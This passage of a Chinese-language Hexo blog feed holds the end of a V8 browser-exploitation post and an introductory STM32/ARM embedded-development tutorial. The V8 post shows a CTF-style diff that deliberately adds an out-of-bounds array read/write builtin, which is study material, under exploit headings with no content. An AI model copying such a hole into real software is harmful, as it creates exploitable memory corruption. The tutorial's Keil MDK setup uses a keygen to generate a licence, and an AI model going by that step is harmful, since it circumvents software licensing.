&#125;<span class="hljs-keyword">else</span>&#123;<br>+        <span class="hljs-comment">//write</span><br>+        <span class="hljs-title class_">Handle</span>&lt;<span class="hljs-title class_">Object</span>&gt; value;<br>+        <span class="hljs-title function_">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(<br>+                isolate, value, <span class="hljs-title class_">Object</span>::<span class="hljs-title class_">ToNumber</span>(isolate, args.<span class="hljs-property">at</span>&lt;<span class="hljs-title class_">Object</span>&gt;(<span class="hljs-number">1</span>)));<br>+        elements.<span class="hljs-title function_">set</span>(length,value-&gt;<span class="hljs-title class_">Number</span>());<br>+        <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReadOnlyRoots</span>(isolate).<span class="hljs-title function_">undefined_value</span>();<br>+    &#125;<br>+&#125;<br> <br> <span class="hljs-title function_">BUILTIN</span>(<span class="hljs-params">ArrayPush</span>) &#123;<br>   <span class="hljs-title class_">HandleScope</span> <span class="hljs-title function_">scope</span>(isolate);<br></code></pre></td></tr></table></figure><p>关联kArrayOob类型和实现函数ArrayOob</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">diff --git a/src/builtins/builtins-definitions.<span class="hljs-property">h</span> b/src/builtins/builtins-definitions.<span class="hljs-property">h</span><br>index <span class="hljs-number">0447230</span>..<span class="hljs-property">f113a81</span> <span class="hljs-number">100644</span><br>--- a/src/builtins/builtins-definitions.<span class="hljs-property">h</span><br>+++ b/src/builtins/builtins-definitions.<span class="hljs-property">h</span><br>@@ -<span class="hljs-number">368</span>,<span class="hljs-number">6</span> +<span class="hljs-number">368</span>,<span class="hljs-number">7</span> @@ namespace internal &#123;<br>   <span class="hljs-title function_">TFJ</span>(<span class="hljs-title class_">ArrayPrototypeFlat</span>, <span class="hljs-title class_">SharedFunctionInfo</span>::kDontAdaptArgumentsSentinel)     \<br>   <span class="hljs-comment">/* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */</span>   \<br>   <span class="hljs-title function_">TFJ</span>(<span class="hljs-title class_">ArrayPrototypeFlatMap</span>, <span class="hljs-title class_">SharedFunctionInfo</span>::kDontAdaptArgumentsSentinel)  \<br>+  <span class="hljs-title function_">CPP</span>(<span class="hljs-title class_">ArrayOob</span>)                                                                \<br>                                                                                \<br>   <span class="hljs-comment">/* ArrayBuffer */</span>                                                            \<br>   <span class="hljs-comment">/* ES #sec-arraybuffer-constructor */</span>                                        \<br>diff --git a/src/compiler/typer.<span class="hljs-property">cc</span> b/src/compiler/typer.<span class="hljs-property">cc</span><br>index ed1e4a5..<span class="hljs-property">c199e3a</span> <span class="hljs-number">100644</span><br>--- a/src/compiler/typer.<span class="hljs-property">cc</span><br>+++ b/src/compiler/typer.<span class="hljs-property">cc</span><br>@@ -<span class="hljs-number">1680</span>,<span class="hljs-number">6</span> +<span class="hljs-number">1680</span>,<span class="hljs-number">8</span> @@ <span class="hljs-title class_">Type</span> <span class="hljs-title class_">Typer</span>::<span class="hljs-title class_">Visitor</span>::<span class="hljs-title class_">JSCallTyper</span>(<span class="hljs-title class_">Type</span> fun, <span class="hljs-title class_">Typer</span>* t) &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-title class_">Type</span>::<span class="hljs-title class_">Receiver</span>();<br>     <span class="hljs-keyword">case</span> <span class="hljs-title class_">Builtins</span>::<span class="hljs-attr">kArrayUnshift</span>:<br>       <span class="hljs-keyword">return</span> t-&gt;cache_-&gt;kPositiveSafeInteger;<br>+    <span class="hljs-keyword">case</span> <span class="hljs-title class_">Builtins</span>::<span class="hljs-attr">kArrayOob</span>:<br>+      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Type</span>::<span class="hljs-title class_">Receiver</span>();<br> <br>     <span class="hljs-comment">// ArrayBuffer functions.</span><br>     <span class="hljs-keyword">case</span> <span class="hljs-title class_">Builtins</span>::<span class="hljs-attr">kArrayBufferIsView</span>:<br></code></pre></td></tr></table></figure><h4 id="构造原语"><a href="#构造原语" class="headerlink" title="构造原语"></a>构造原语</h4><p><strong>addressOf</strong></p><p><strong>fakeObject</strong></p><h4 id="实现任意地址读写"><a href="#实现任意地址读写" class="headerlink" title="实现任意地址读写"></a>实现任意地址读写</h4><h4 id="利用wasm机制执行shellcode"><a href="#利用wasm机制执行shellcode" class="headerlink" title="利用wasm机制执行shellcode"></a>利用wasm机制执行shellcode</h4><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://jhalon.github.io/chrome-browser-exploitation-1/">Chrome Browser Exploitation, Part 1: Introduction to V8 and JavaScript Internals</a></p><p><a href="https://taligarsiel.com/Projects/howbrowserswork1.htm">How browsers work - Behind the scenes of modern web browsers</a></p><p><a href="https://www.yanceyleo.com/post/e46bf3a4-c421-4273-86e8-0621bdc3cfcb">浏览器架构的前生今世</a></p><p><a href="https://cloud.tencent.com/developer/news/721616">Chrome浏览器引擎 Blink &amp; V8</a></p><p><a href="https://blog.csdn.net/qq_45323960/article/details/130124693">[sky123]Chrome v8 pwn</a></p><p><a href="https://warm-winter.github.io/2020/10/23/17-42/">[Shuwen’s blog]chrome study by v8 oob</a></p><p><a href="https://juejin.cn/post/7044790352657514509">V8 编译浅谈</a></p><p><a href="https://www.keisei.top/architecture-of-v8-memory/">[译]了解 V8 内存管理</a></p><p><a href="https://xz.aliyun.com/t/5190?time__1311=n4+xnieWqCqYq0KoGNDQTRuxRxbDuiDgWEGoD#toc-10">v8 exploit入门[PlaidCTF roll a d8]</a></p>]]></content>
    
    
    <categories>
      
      <category>Browser Pwn</category>
      
      <category>V8</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>chrome v8</tag>
      
      <tag>浏览器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>嵌入式基础及STM32开发入门</title>
    <link href="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <url>/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="嵌入式基础及STM32开发入门"><a href="#嵌入式基础及STM32开发入门" class="headerlink" title="嵌入式基础及STM32开发入门"></a>嵌入式基础及STM32开发入门</h1><h2 id="关于ARM"><a href="#关于ARM" class="headerlink" title="关于ARM"></a>关于ARM</h2><h3 id="商业模式"><a href="#商业模式" class="headerlink" title="商业模式"></a>商业模式</h3><p>ARM架构是由总部位于英国的ARM公司设计和授权的指令集和处理器架构。ARM公司只负责指令集和处理器架构的设计，然后授权给半导体厂商，由半导体厂商负责硬件的具体实现。</p><p>常见的ARM处理器厂商和生产产品：</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/1.png" alt="1"></p><h3 id="ARM架构和微架构-处理器架构"><a href="#ARM架构和微架构-处理器架构" class="headerlink" title="ARM架构和微架构(处理器架构)"></a>ARM架构和微架构(处理器架构)</h3><p>ARM架构指的是一系列的功能规范，定义了处理器的行为方式，包括支持的指令集和处理器的基本功能。它是硬件和软件之间的契约，描述了软件可以依赖硬件提供哪些功能‌。</p><p>不同版本ARM架构的命名采用ARMvXX的形式，例如ARMv1、ARMv4T、ARMv2a、ARMv6-M、ARMv7-R、ARMv7-A。</p><p>微架构是从ARM架构到处理器(也叫内核、CPU)的具体实现的设计。一种ARM架构可以对应多个微架构，一种微架构只对应一种处理器并且通常命名上不对微架构和处理器做区分。</p><p>不同型号的微架构没有完全固定的命名格式，大部分基于所属的系列或具体应用来进行命名。</p><p>微架构可以分为ARM公司自己研发的内核以及ARM公司授权第三方研发的内核：</p><ul><li><p>官方微架构：包括经典内核(ARM1-ARM11)、SecureCore内核(SC000、SC100、SC300)、Cortex-M&#x2F;R&#x2F;A内核(Cortex-M4、Cortex-R4、Cortex-A7)等。ARMv1-ARMv6主要是经典内核。在ARM11以后，从ARMv7开始，ARM公司停止了经典内核的版本迭代并改用Cortex命名。ARMv7架构定义了三大分工明确的系列：“A”系列面向尖端的基于虚拟内存的操作系统和用户应用(如智能手机、平板电脑、个人PC和服务器)；“R”系列针对实时系统(如汽车电子系统、工业控制器)；“M”系列对微控制器(如物联网设备、传感器、嵌入式控制器)。后来，从ARMv8开始，又改为了推出Neoverse系列内核。</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/2.png" alt="2"></p></li><li><p>第三方微架构，例如苹果为A系列芯片定制的内核(Swift、Cyclone、Twister等)、苹果为M系列芯片定制的内核(Apple M3、Apple M4等)、三星为Exynos系列芯片定制的内核(M1、M2、M3等)、高通为Snapdragon系列芯片定制的内核(Scorpion、Krait、Kryo等)。</p></li></ul><p><a href="https://en.wikipedia.org/wiki/List_of_ARM_processors">[Wiki]List of ARM processors</a>中有官方微架构与ARM架构的对应 关系表、第三方产品系列与ARM架构和微架构对应关系表、官方微架构推出的时间线表。</p><h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><p>ARM架构采用精简指令集(RISC)设计，其指令集有thumb、thumb-2、Arm、AArch64(Arm64)</p><ul><li>Arm:32位指令集。32位arm处理器的核心指令集，一般兼容thumb或thumb2。</li><li>thumb:16位指令集。thumb是arm指令集的子集，没有完整的体系结构，无法单独使用。thumb使程序能够在16位和32位指令集之间切换，减少存储空间的占用并提高运行速度。</li><li>thumb-2:16&#x2F;32位混合指令集。拓展后的thumb指令集，引入了新的指令和优化，加强了性能以及与32位arm指令集的兼容性。</li><li>AArch64:64位指令集。64位arm处理器的核心指令集。Armv7处理器架构及以前只支持32位，从Armv8处理器架构开始支持AArch64同时兼容32位arm和thumb-2，目前最新的Armv9处理器架构开始只支持64位，不再兼容32位。</li></ul><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/3.png" alt="3"></p><h2 id="常见嵌入式芯片分类及介绍"><a href="#常见嵌入式芯片分类及介绍" class="headerlink" title="常见嵌入式芯片分类及介绍"></a>常见嵌入式芯片分类及介绍</h2><h3 id="MCU"><a href="#MCU" class="headerlink" title="MCU"></a>MCU</h3><p>名称：Micro controller Unit(微控制单元)，又称为单片机。</p><p>组成：集成了CPU、存储器(RAM、ROM)、I&#x2F;O接口、时钟电路、各种外设等部分的单芯片系统。</p><p>特性：</p><ul><li>没有MMU(内存管理单元)，只能进行单一任务作业，多数只能运行裸机系统或小型的实时操作系统（RTOS），如FreeRTOS、RT-Thread等。</li><li>资源有限，不能执行非常复杂的任务和运算。</li><li>低功耗、低成本、体积小、集成度高、实时性强。</li></ul><p>应用场景：工业控制、汽车电子、消费电子等领域。实时性要求高，进行简单控制，不需要强大运算和处理能力的场景。</p><p>典型产品：</p><ul><li><strong>51单片机</strong>：最早的8位MCU之一，用于简单控制任务。</li><li><strong>AVR系列</strong>：如Atmel公司的ATmega，广泛用于Arduino等开源硬件项目。</li><li><strong>STM32系列</strong>：由STMicroelectronics公司推出，具有丰富的资源和外设，是工业和消费电子常用的32位MCU。</li><li><strong>ESP32系列</strong>：由Espressif公司生产，集成了WiFi和蓝牙功能，非常适合物联网（IoT）应用。</li></ul><h3 id="MPU"><a href="#MPU" class="headerlink" title="MPU"></a>MPU</h3><p>名称：Micro Processor Unit(微处理器单元)，通称微处理器。</p><p>组成：主要包含CPU核心、缓存、基本I&#x2F;O接口和中断控制器，但与MCU不同，通常没有内建RAM和Flash，需外部配备存储器和其他必要外设。</p><p>特性：</p><ul><li>通常包含MMU（内存管理单元），可以运行复杂操作系统，如Linux。</li><li>相比MCU，处理性能更高，支持多任务操作，但功耗也较大。</li><li>可执行更复杂的数据处理任务，适合高计算需求的场合。</li></ul><p>应用场景：需要多任务处理和较强运算能力的嵌入式系统中，如智能家居网关、网络设备和工业自动化。</p><p>典型产品：</p><ul><li><strong>ARM Cortex-A系列</strong>：常见的高性能嵌入式处理器，用于智能终端、网关设备等。</li><li><strong>i.MX系列</strong>：NXP公司推出，适用于汽车娱乐、医疗设备等。</li><li><strong>Sitara系列</strong>：由德州仪器(TI)推出，适合工业自动化、嵌入式视觉等领域。</li></ul><h3 id="SoC"><a href="#SoC" class="headerlink" title="SoC"></a>SoC</h3><p>名称：System on Chip(片上系统)</p><p>组成：将CPU、GPU、RAM、ROM、I&#x2F;O接口、模拟电路、通信模块等各种功能模块集成在一个芯片上。</p><p>特性：</p><ul><li>高度集成，具备处理器、存储器、接口、外设等多种模块，减少外围电路需求。</li><li>支持复杂操作系统，如Linux、Android，且多用于性能要求较高的应用场景。</li><li>设计复杂，通常为定制芯片，适用于特定应用。</li></ul><p>应用场景：智能手机、物联网设备、智能家居等需要多功能和较高性能的场景。</p><p>典型产品：</p><ul><li><strong>高通骁龙系列</strong>：广泛应用于智能手机和平板设备。</li><li><strong>苹果A系列</strong>：用于苹果的iPhone、iPad等设备中。</li><li><strong>ESP8266&#x2F;ESP32</strong>：Espressif公司推出的SoC，适合物联网和低功耗无线通信场景。</li></ul><h3 id="DSP"><a href="#DSP" class="headerlink" title="DSP"></a>DSP</h3><p>名称：Digital Signal Processor(数字信号处理器)</p><p>组成：以处理数字信号为核心，包含快速乘法器、累加器、硬件回路等高效处理单元。</p><p>特性：</p><ul><li>专门为信号处理而设计，能够执行快速的FFT、滤波、矩阵运算等。</li><li>实时处理能力强，适合处理连续的大量数据流。</li><li>多数DSP运行专用软件，不适合通用计算。</li></ul><p>应用场景：通信、音视频处理、图像处理、语音识别等需要实时信号处理的场景。</p><p>典型产品：</p><ul><li><strong>TI的C6000系列</strong>：广泛应用于音视频信号处理、通信等领域。</li><li><strong>Analog Devices的SHARC系列</strong>：用于高性能音频、图像处理应用。</li><li><strong>Qualcomm Hexagon</strong>：集成于高通SoC中，用于音频、图像等加速处理。</li></ul><h3 id="FPGA"><a href="#FPGA" class="headerlink" title="FPGA"></a>FPGA</h3><p>名称：Field Programmable Gate Array(现场可编程门阵列)</p><p>组成：由可编程逻辑单元、可配置I&#x2F;O接口、时钟管理模块等组成，可以根据设计需求配置逻辑功能。</p><p>特性：</p><ul><li>用户可通过硬件描述语言(HDL)编程配置逻辑，实现特定的电路功能。</li><li>并行处理能力强，适合高实时性、复杂逻辑的处理任务。</li><li>相比ASIC，开发周期短、成本低，但功耗较高、集成度不如ASIC。</li></ul><p>应用场景：高速数据处理、视频图像处理、软件定义无线电、科学计算等对实时性、并行处理有高要求的场景。</p><p>典型产品：</p><ul><li><strong>Xilinx的Zynq系列</strong>：集成ARM核心与FPGA逻辑，适用于嵌入式系统开发。</li><li><strong>Intel（Altera）的Stratix系列</strong>：高性能FPGA，广泛应用于数据中心、通信等高性能计算场景。</li></ul><h3 id="ASIC"><a href="#ASIC" class="headerlink" title="ASIC"></a>ASIC</h3><p>名称：Application-Specific Integrated Circuit(应用专用集成电路)</p><p>组成：根据特定应用设计的定制化电路，包含固定逻辑和处理单元。</p><p>特性：</p><ul><li>完全为特定功能定制，性能高，功耗低，体积小。</li><li>一旦设计完成不可更改，开发周期长、成本高，但单位成本低，适合大规模量产。</li><li>集成度高，适合大规模商业产品。</li></ul><p>应用场景：矿机芯片、网络芯片、视频解码芯片等大批量生产的定制需求场景。</p><p>典型产品：</p><ul><li><strong>比特币矿机芯片</strong>：如比特大陆的BM系列，专门用于加密货币挖矿。</li><li><strong>苹果M系列芯片</strong>：苹果的自研芯片，适用于Mac产品中。</li><li><strong>Google TPU</strong>：用于机器学习任务的专用芯片。</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>除了上述常见嵌入式芯片类型，还有一些专用或混合类型的芯片：</p><ul><li><strong>GPU</strong>（图形处理器）：用于加速图形和并行计算，在深度学习领域也应用广泛。</li><li><strong>NPU</strong>（神经网络处理器）：专为AI和机器学习任务设计，加速神经网络推理和训练过程。</li><li><strong>TPU</strong>（张量处理器）：Google推出的专用AI芯片，优化了张量计算，广泛用于深度学习。</li></ul><p>这些芯片类型丰富了嵌入式系统的应用领域，根据需求的不同可以选择相应的芯片来优化系统性能。</p><h2 id="STM32简介"><a href="#STM32简介" class="headerlink" title="STM32简介"></a>STM32简介</h2><p>STM32是意法半导体(STMicroelectronics)公司推出的基于<code>32位ARM Cortex-M内核</code>的<code>微控制器(MCU)</code>产品系列。STM32有十几个不同的系列，几百个不同的型号，广泛应用于工业自动化、消费电子、医疗设备、通信、汽车电子等领域。</p><p>如图就是一块STM32F103的MCU</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/4.jpg" alt="4"></p><h3 id="命名规范和产品系列"><a href="#命名规范和产品系列" class="headerlink" title="命名规范和产品系列"></a>命名规范和产品系列</h3><p><a href="https://www.st.com.cn/resource/en/product_presentation/microcontrollers-stm32-family-overview.pdf">microcontrollers-stm32-family-overview</a></p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/5.png" alt="5"></p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/6.png" alt="6"></p><h3 id="内部结构和存储映射"><a href="#内部结构和存储映射" class="headerlink" title="内部结构和存储映射"></a>内部结构和存储映射</h3><p>STM32 MCU内部通常包括处理器(内核)、ROM、RAM、片上外设、调试系统、时钟和复位模块、IO设备等部分。</p><p>ROM掉电后数据不丢失，一般存放要运行的程序(固件)；ROM掉电后数据丢失，但是和CPU交互速度比ROM快很多，一般存储运行中的动态数据。</p><p>具体的内部结构需要参考对应型号MCU的数据手册。这里以官方的<a href="https://www.st.com.cn/resource/en/datasheet/stm32f405rg.pdf">STM32F40xxx参考手册</a>为例。</p><p>不同引脚的名称，有64脚、100脚、144脚、176脚的，这里只贴了64脚的。</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/7.png" alt="7"></p><p>可以看到ROM使用的是FLASH，RAM使用SRAM，内核是Arm Cortex-M4，许多类似CAN、UART、I2C的外设接口连接至AHB&#x2F;APB总线</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/8.png" alt="8"></p><p>内存映射如图，可以看到最常用的ROM和RAM基址分别为0x08000000和0x20000000，还可以看到AHB&#x2F;APB总线的地址，我们可以通过AHB&#x2F;APB地址来访问外设。</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/9.png" alt="9"></p><h2 id="硬件配置"><a href="#硬件配置" class="headerlink" title="硬件配置"></a>硬件配置</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">MCU：ST<span class="hljs-name">M32</span>F<span class="hljs-number">407</span>ZGT<span class="hljs-number">6</span><span class="hljs-comment">(Cortex-M4内核)</span><br>开发板：启明欣欣ST<span class="hljs-name">M32</span>F<span class="hljs-number">407</span>高配版V<span class="hljs-number">5.1</span><span class="hljs-comment">(IMT407 V5.1)</span><br>调试器：CMSIS DAP<br>其它：杜邦线、面包板、显示屏、USB转各种串口的模块等，取决于具体应用<br></code></pre></td></tr></table></figure><p>笔者的硬件配置如上，下面是一些相关细节</p><h3 id="MCU-1"><a href="#MCU-1" class="headerlink" title="MCU"></a>MCU</h3><p><a href="https://www.st.com.cn/resource/en/datasheet/stm32f405rg.pdf">官网STM32F40xxx参考手册</a></p><p><a href="https://pan.baidu.com/s/1wUhkpD-3_2ZQ4H3bL9UfSg?pwd=9413">STM32F407ZGT6数据手册(datasheet)</a></p><h3 id="开发板"><a href="#开发板" class="headerlink" title="开发板"></a>开发板</h3><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/407%E9%AB%98%E9%85%8D%E7%89%88V4.1%E5%A4%96%E8%AE%BE%E4%B8%8E%E6%8E%A5%E5%8F%A3%E4%BB%8B%E7%BB%8D.jpg" alt="407高配版V4.1外设与接口介绍"></p><h3 id="关于仿真器和调试器"><a href="#关于仿真器和调试器" class="headerlink" title="关于仿真器和调试器"></a>关于仿真器和调试器</h3><p>仿真器和调试器是两个不同的概念</p><p>仿真器的运行不需要MCU实物，通过硬件或软件的形式模拟MCU的运行并提供调试功能。仿真器的缺点是价格贵、不通用，往往某款仿真器只针对单一型号的MCU。所以开发中仿真器一般适用于不含硬件调试模块(不支持调试器)的MCU，比如51单片机。</p><p>调试器需要MCU实物，配合软件，通过JTAG或SWD接口，可以<code>实时监测程序的执行状态、寄存器、内存</code>等，并支持<code>单步执行、断点调试、变量跟踪</code>等功能，还可以<code>烧录和下载程序</code>。使用什么调试器取决于内核的架构，STM32是ARM Cortex-M系列的内核，可以选择的调试器包括JLINK、STLINK、CMSIS DAP、ULINK2等，不同仿真器的兼容性、功能性和价格都不同，需要根据具体需求选择购买。</p><ul><li>JLINK：通用型的ARM内核芯片调试器，支持的芯片和软件开发环境多，兼容性和功能性最强，价格最高。</li><li>STLINK：由意法半导体推出的针对STM8&#x2F;STM32芯片的调试器，不支持其它MCU，专门做STM32开发可以选择这款。</li><li>CMSIS DAP：针对Cortex处理器的开源的标准调试协议，厂商和个人可以基于该协议开发调试器，产品统称CMSIS DAP。缺点是不被STM32CubeIDE和STM32CubeProg支持。价格介于JLINK和STLINK之间，性价比高。</li><li>ULINK2：专注于Keil平台，支持ARM7&#x2F;9，Cortex-M0~M4以及8051系列芯片，综合性能不如JLINK。</li></ul><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>开发环境的搭建主要参考<a href="https://www.bilibili.com/opus/988041008693379072?jump_opus=1">Keil5安装+STM32CubeMX安装+VSCode辅助开发教程</a></p><p>软件安装包：<a href="https://pan.baidu.com/s/15vp3RBWX4wO9S26pzkO3Fw?pwd=9413">传送门</a></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Keil MDK + ST<span class="hljs-name">M32</span>CubeMX + <span class="hljs-attr">VsCode辅助代码编辑</span><br></code></pre></td></tr></table></figure><h3 id="Keil-MDK"><a href="#Keil-MDK" class="headerlink" title="Keil MDK"></a>Keil MDK</h3><p>KEIL是一家德国的公司，于05年被ARM收购，主要的产品是针对嵌入式开发的IDE软件Keil µVision。</p><p>Keil µVision是一系列Keil IDE的统称，主要有MDK、 C51、 C166、 C251四种IDE，分别针对不同内核架构的开发板，其中Keil MDK针对ARM内核，所以我们使用Keil MDK作为STM32开发的IDE。</p><p>Keil µVision目前版本迭代到Keil µVision5，其中的每种IDE也有自己的版本迭代，不过由于被ARM收购，近几年Keil µVision的更新主要集中在Keil MDK，其它几种内核的IDE几乎没怎么更新。</p><p>其实是可以让Keil µVision同时兼容多个内核的，后文安装完Keil MDK会介绍怎么兼容Keil C51。</p><p>双击安装mdk540.exe，选择安装路径</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/10.png" alt="10"></p><p>用户信息可以随便输，不输中文就行</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/11.png" alt="11"></p><p>File选项卡-&gt;License Management打开证书管理，复制CID。打开Keygen，填入CID，Target选择ARM，其余不变，点击Generate生成License ID Code。</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/12.png" alt="12"></p><p>以管理员身份运行Keil MDK，填入LIC后点击Add LIC添加证书</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/13.png" alt="13"></p><p>双击安装STM32F4X和STM32F1X的芯片支持包<code>Keil.STM32F4xx_DFP.2.12.0.pack</code>和<code>Keil.STM32F1xx_DFP.2.1.0.pack</code>。芯片支持包可以从Keil官网下载，参考该<a href="https://blog.csdn.net/weixin_59413709/article/details/135582773">文章</a>。</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/14.png" alt="14"></p><p>在联网的情况下，也可以通过UV4目录中的Pack包管理工具<code>PackInstaller.exe</code>安装和管理芯片包。Keil也会自动识别工程对应的芯片包，如果没有安装，打开工程时会提醒是否要安装，选择直接安装即可。如图，左侧选择芯片型号，右侧显示所选型号对应的芯片包以及一些通用包，可以安装、更新和删除。</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/15.png" alt="15"></p><h4 id="Compiler-Version5编译器"><a href="#Compiler-Version5编译器" class="headerlink" title="Compiler Version5编译器"></a>Compiler Version5编译器</h4><p>从Keil MDK5.37开始，编译器由Compiler Version5更新为Compiler Version6，这导致高版本Keil MDK不兼容旧版本的工程文件。所以需要手动安装Compiler Version5编译器。</p><p>将<code>ARMCC</code>文件夹复制到MDK安装目录的Arm文件夹中</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/16.png" alt="16"></p><p>打开测试工程</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/17.png" alt="17"></p><p>添加新编译器，路径是刚刚复制的ARMCC</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/18.png" alt="18"></p><p>点击魔术棒切换至Compiler Version5编译器</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/19.png" alt="19"></p><p>编译测试工程进行测试</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/20.png" alt="20"></p><h4 id="兼容C51-非必要"><a href="#兼容C51-非必要" class="headerlink" title="兼容C51(非必要)"></a>兼容C51(非必要)</h4><p>双击<code>兼容C51</code>文件夹中的KeilC51安装包<code>c51v959.exe</code>。KeilMDK位于F盘，KeilC51也安装到F盘</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/21.png" alt="21"></p><p>用户信息和KeilMDK安装的时候相同</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/22.png" alt="22"></p><p>将C51文件夹复制到Keil5 MDK的安装目录中</p><p><img src="/2024/11/11/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%9F%BA%E7%A1%80%E5%8F%8ASTM32%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/23.png" 